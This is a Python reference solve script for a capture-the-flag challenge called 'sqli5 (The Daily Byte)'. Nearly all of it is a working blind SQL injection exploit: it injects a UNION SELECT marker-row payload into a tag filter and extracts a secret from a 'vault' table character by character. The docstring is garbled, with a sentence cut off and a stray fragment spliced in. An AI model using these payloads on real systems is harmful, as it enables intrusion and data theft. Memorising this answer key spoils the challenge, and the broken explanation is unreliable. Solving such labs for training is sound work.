#!/usr/bin/env python3
"""Reference solve for sqli5 (The Daily Byte).

The tag filter builds its query by concatenation:

    SELECT id, title, tag, posted FROM posts WHERE tag='<t>'

The page shows exactly the rows that match, and nothing else - no
errors, no counts. So the oracle is a marker row: a term of the form

    zzz' UNION SELECT 1, '>>MARKER<<', 3, 4
        WHERE (SELECT substr(secret,N,1) FROM vault LIMIT 1) = '<c>' --

adds one extra row whose title is >>MARKER<<, and only when the Nth
character matches (the page HTML-escapes the arrows, so the check runs
on the unescaped text).
character of the vault secret equals <c> (no post is tagged "zzz...",
so a plain lookup returns nothing). Scanning <c> per position reads the
secret one character at a time.

    python solve.py                 # localhost:8034
    python solve.py http://host:8034
"""
import html
import os
import re
import sys
import time

import requests  # pip install requests

BASE = sys.argv[1] if len(sys.argv) > 1 else os.environ.get(
    "BASE", "http://127.0.0.1:8034")
FLAG_RE = re.compile(r"flag\{[^}]+\}")
MARKER = ">>MARKER<<"
CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789_-{}.!"


def main() -> int:
    s = requests.Session()
    for _ in range(30):
        try:
            s.get(BASE, timeout=3)
            break
        except requests.RequestException:
            time.sleep(1)

    def marker_visible(pos: int, ch: str) -> bool:
        q = (f"zzz' UNION SELECT 1, '{MARKER}', 3, 4 WHERE "
             f"(SELECT substr(secret,{pos},1) FROM vault LIMIT 1) = '{ch}' -- ")
        r = s.get(BASE, params={"tag": q}, timeout=10)
        return MARKER in html.unescape(r.text)

    text = ""
    pos = 1
    while pos <= 200:
        found = None
        for ch in CHARSET:
            if marker_visible(pos, ch):
                found = ch
                break
        if found is None:
            break
        text += found
        if text.startswith("flag{") and text.endswith("}"):
            break
        pos += 1

    m = FLAG_RE.search(text)
    if m:
        print(m.group(0))
        return 0
    sys.stderr.write(f"no flag found in extracted text: {text!r}\n")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
